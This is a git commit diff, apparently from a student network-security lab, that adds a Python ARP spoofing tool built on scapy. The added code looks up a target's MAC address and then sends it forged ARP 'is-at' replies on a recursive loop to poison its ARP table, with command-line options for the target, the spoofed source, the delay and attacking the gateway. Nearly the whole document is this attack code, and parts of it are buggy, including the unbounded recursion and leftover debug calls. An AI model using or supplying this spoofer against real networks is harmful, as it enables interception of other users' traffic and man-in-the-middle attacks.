44196bc498fe9a1fcf3973e2ee542cf6cadfb4ec
Idan Maman <90776557+idanmaman2@users.noreply.github.com>
2022-11-18 12:05:21 +0200

    fixed harel ;)

--- main.py
+++ main.py
@@ -1,13 +1,32 @@
 #!/usr/bin/python
 
 import sys, getopt
-from scapy.all import * #sniff,Ether,RandInt,RandMAC,srp1,sendp
-from scapy.layers.l2 import Ether
-from scapy.utils import mac2str
+from scapy.all import Ether , ARP,conf, get_if_addr,srp1,sendp
+from time import sleep
+BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
+options = {
+        "interface" :conf.iface,
+        "delay" : 3 , 
+        "attackGW" : None , 
+        "target" : "127.0.0.1",
+        "src": None
+    } 
+def getTargetMac(target : str)->str : 
+    etherAttack = Ether(dst =BROADCASTMAC)
+    arpAttack = ARP(pdst = target  , op = "who-has" )
+    reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
+    return reply[Ether].src
 
-def main(argv):
+def changeArpTable( target : str , src :str )->None:
+    etherAttack = Ether(dst =getTargetMac(target))
+    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
+    sendp(etherAttack/arpAttack , iface=options["interface"],verbose=False)
+    sleep(options["delay"])
+    changeArpTable(target,src)
+
+
+def main(argv :list )->None:
     '''
-    C:\\PycharmProjects\\NetSecLab>python ArpSpoofer.py –h
     usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw]
             -t TARGET
     Spoof ARP tables
@@ -22,45 +41,37 @@ def main(argv):
         -t TARGET, --target TARGET
                             IP of target
     '''
-    print("ARP Spoofer")
-    interface = "eth0"
-    #src = get_if_addr(interface)
-    delay=3
-    attackGW=False
-    target = "127.127.127.127"
 
     try:
-        opts, args = getopt.getopt(argv, "hi:o:", ["ifile=", "ofile="])
-    except getopt.GetoptError:
-        print(main.__doc__)
-        sys.exit(2)
+        opts, args = getopt.getopt(argv, "s:t:d:gw:h", [
+                                    "src=","delay=","target=","getway","help"])
+    except getopt.GetoptError as e:
+        print(e)
+        sys.exit(-1)
     for opt, arg in opts:
+        print(opt,arg)
         if opt == '-h':
             print(main.__doc__)
             sys.exit()
         elif opt in ("-i", "--iface"):
-            interface = arg
+            options["interface"] = arg
             #src = get_if_addr()
         elif opt in ("-s", "--src"):
-            src = arg
+            options["src"] = arg
         elif opt in ("-d", "--delay"):
-            delay = arg
-        elif opt in ("-gw", "--delay"):
-            attackGW = True
+            options["delay"] = arg
+        elif opt in ("-gw", "--getway"):
+            options["attackGW"] = True
         elif opt in ("-t", "--target"):
-            target = arg
+            options["target"] = arg
 
+    if not options["src"]:
+        options["src"]=  get_if_addr(options["interface"])
+    print(options.items())
 
-
-
-
-
+    print(getTargetMac("10.100.102.1"))
 
 if __name__ == "__main__":
     main(sys.argv[1:])
 
-'''# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    main(sys.argv[1:])'''
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
